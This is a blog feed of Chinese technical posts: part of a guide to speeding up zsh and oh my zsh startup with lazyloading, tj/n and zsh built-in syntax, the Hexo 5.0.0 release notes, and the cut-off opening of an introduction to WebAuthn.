时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 